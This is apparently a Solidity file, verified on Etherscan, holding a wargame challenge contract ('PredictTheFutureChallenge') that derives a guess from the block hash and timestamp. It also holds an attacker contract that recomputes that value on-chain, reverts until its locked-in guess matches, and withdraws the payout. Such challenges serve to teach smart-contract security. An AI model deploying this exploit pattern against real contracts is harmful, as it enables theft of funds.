/**
 *Submitted for verification at Etherscan.io on 2022-09-05
*/

pragma solidity ^0.4.21;

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract AttackPredictTheFutureChallenge {
    PredictTheFutureChallenge chall;
    address owner;
    function AttackPredictTheFutureChallenge(address target) public payable {
        require(msg.value == 1 ether);
        owner = msg.sender;
        chall = PredictTheFutureChallenge(target);
        chall.lockInGuess.value(1 ether)(0);
    }

    function trySettle() public {
        if (uint8(keccak256(block.blockhash(block.number - 1), now)) % 10 == 0) {
            chall.settle();
        } else {
            revert();
        }
    }

    function () public payable {
    }

    function withdraw() public {
        require(msg.sender == owner);
        msg.sender.transfer(2 ether);
    }
}